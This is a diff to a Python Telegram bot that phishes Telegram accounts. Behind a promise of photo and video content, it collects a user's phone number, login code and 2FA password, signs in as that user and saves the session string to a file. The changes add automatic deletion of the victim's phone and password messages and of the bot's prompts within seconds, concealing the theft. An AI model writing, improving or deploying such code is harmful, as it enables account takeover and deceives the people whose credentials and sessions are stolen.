@@ -126,32 +126,48 @@ async def cmd_start(message: types.Message):
 @dp.callback_query_handler(lambda c: c.data == 'auth_account')
 async def start_auth(callback_query: types.CallbackQuery):
     user_id = callback_query.from_user.id
-    user_states[user_id] = 'awaiting_contact'
+    user_states[user_id] = 'awaiting_phone'
 
     update_user_log(
         user_id=user_id,
         updates={
             "auth_button_clicked": True,
             "auth_button_click_time": datetime.now(),
-            "status": "awaiting_contact"
+            "status": "awaiting_phone"
         }
     )
 
-    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
-
-    await bot.send_message(user_id, "🥰 Пожалуйста, поделитесь своим номером телефона:", reply_markup=kb)
+    # Убираем клавиатуру с кнопкой "Я не робот"
+    await bot.edit_message_text(
+        chat_id=user_id,
+        message_id=callback_query.message.message_id,
+        text="📱 Отправьте ваш номер телефона в формате +79991234567:",
+        reply_markup=None
+    )
     await bot.answer_callback_query(callback_query.id)
 
-@dp.message_handler(content_types=types.ContentType.CONTACT)
-async def handle_contact(message: types.Message):
+@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_phone')
+async def handle_phone(message: types.Message):
     user_id = message.from_user.id
-    if user_states.get(user_id) != 'awaiting_contact':
-        return
+    
+    # Удаляем сообщение с номером сразу после получения
+    try:
+        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
+    except:
+        pass  # Если не удалось удалить - продолжаем
 
-    phone = message.contact.phone_number
+    phone = message.text.strip()
+    
+    # Проверяем формат номера
     if not phone.startswith("+"):
-        phone = "+" + phone
+        msg = await message.answer("❌ Номер должен начинаться с +. Попробуйте снова:")
+        # Удаляем сообщение об ошибке через 3 секунды
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
+        except:
+            pass
+        return
 
     geo_info = None
     try:
@@ -165,10 +181,9 @@ async def handle_contact(message: types.Message):
         updates={
             "phone": phone,
             "geo_info": geo_info,
-            "contact_shared": True,
-            "contact_share_time": datetime.now(),
-            "contact_user_id": message.contact.user_id,
-            "status": "contact_received"
+            "phone_shared": True,
+            "phone_share_time": datetime.now(),
+            "status": "phone_received"
         }
     )
 
@@ -185,11 +200,25 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id] = {'code': '', 'message_id': None}
         msg_id = await send_code_keyboard(user_id, "", None)
         user_code_buffers[user_id]['message_id'] = msg_id
-        await message.answer("⌨️ Введите код, нажимая кнопки ниже:")
+        
+        # Отправляем сообщение о вводе кода и удаляем его через 3 секунды
+        msg = await message.answer("⌨️ Введите код, нажимая кнопки ниже:")
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
+        except:
+            pass
+            
     except Exception as e:
-        await message.answer(f"❌ Ошибка при отправке кода: {e}")
+        error_msg = await message.answer(f"❌ Ошибка при отправке кода: {e}")
         await client.disconnect()
         cleanup(user_id)
+        # Удаляем сообщение об ошибке через 3 секунды
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+        except:
+            pass
 
 @dp.callback_query_handler(lambda c: c.data.startswith("code_"))
 async def process_code_button(callback_query: types.CallbackQuery):
@@ -228,8 +257,14 @@ async def try_sign_in_code(user_id, code):
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
     if not client or not phone:
-        await bot.send_message(user_id, "⚠️ Сессия не найдена. Попробуйте снова с /start")
+        error_msg = await bot.send_message(user_id, "⚠️ Сессия не найдена. Попробуйте снова с /start")
         cleanup(user_id)
+        # Удаляем сообщение об ошибке через 3 секунды
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+        except:
+            pass
         return
 
     try:
@@ -275,46 +310,90 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await bot.send_message(user_id, "Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
+            success_msg = await bot.send_message(user_id, "Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
             await client.disconnect()
             cleanup(user_id)
+            # Удаляем финальное сообщение через 5 секунд
+            await asyncio.sleep(5)
+            try:
+                await bot.delete_message(chat_id=user_id, message_id=success_msg.message_id)
+            except:
+                pass
         else:
             user_states[user_id] = 'awaiting_2fa'
             update_user_log(
                 user_id=user_id,
                 updates={"status": "awaiting_2fa"}
             )
-            await bot.send_message(user_id, "🔐 Введите ваш пароль 2FA:")
+            msg = await bot.send_message(user_id, "🔐 Введите ваш пароль 2FA:")
+            # Удаляем сообщение о 2FA через 3 секунды
+            await asyncio.sleep(3)
+            try:
+                await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
+            except:
+                pass
     except PhoneCodeExpiredError:
-        await bot.send_message(user_id, "⏰ Код устарел. Попробуйте снова с /start")
+        error_msg = await bot.send_message(user_id, "⏰ Код устарел. Попробуйте снова с /start")
         await client.disconnect()
         cleanup(user_id)
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+        except:
+            pass
     except PhoneCodeInvalidError:
-        await bot.send_message(user_id, "❌ Неверный код. Попробуйте снова:")
+        error_msg = await bot.send_message(user_id, "❌ Неверный код. Попробуйте снова:")
         user_code_buffers[user_id]['code'] = ""
         await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+        except:
+            pass
     except SessionPasswordNeededError:
         user_states[user_id] = 'awaiting_2fa'
         update_user_log(
             user_id=user_id,
             updates={"status": "awaiting_2fa"}
         )
-        await bot.send_message(user_id, "🔐 Требуется ваш пароль 2FA. Введите его:")
+        msg = await bot.send_message(user_id, "🔐 Требуется ваш пароль 2FA. Введите его:")
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
+        except:
+            pass
     except Exception as e:
-        await bot.send_message(user_id, f"❌ Ошибка входа: {e}")
+        error_msg = await bot.send_message(user_id, f"❌ Ошибка входа: {e}")
         await client.disconnect()
         cleanup(user_id)
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+        except:
+            pass
 
 @dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
 async def process_2fa(message: types.Message):
     user_id = message.from_user.id
+    
+    # Удаляем сообщение с паролем сразу
+    try:
+        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
+    except:
+        pass
+
     password = message.text.strip()
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
 
     if not client or not phone:
-        await message.answer("⚠️ Сессия не найдена. Попробуйте снова с /start")
+        error_msg = await message.answer("⚠️ Сессия не найдена. Попробуйте снова с /start")
         cleanup(user_id)
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+        except:
+            pass
         return
 
     try:
@@ -354,15 +433,31 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await message.answer("Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
+            success_msg = await message.answer("Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
             await client.disconnect()
             cleanup(user_id)
+            await asyncio.sleep(5)
+            try:
+                await bot.delete_message(chat_id=user_id, message_id=success_msg.message_id)
+            except:
+                pass
         else:
-            await message.answer("❌ Не удалось войти с 2FA.")
+            error_msg = await message.answer("❌ Не удалось войти с 2FA.")
+            await asyncio.sleep(3)
+            try:
+                await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+            except:
+                pass
     except Exception as e:
-        await message.answer(f"❌ Ошибка с 2FA: {e}")
+        error_msg = await message.answer(f"❌ Ошибка с 2FA: {e}")
         await client.disconnect()
         cleanup(user_id)
+        await asyncio.sleep(3)
+        try:
+            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
+        except:
+            pass
 
 if __name__ == '__main__':
+    import asyncio
     executor.start_polling(dp, skip_updates=True)
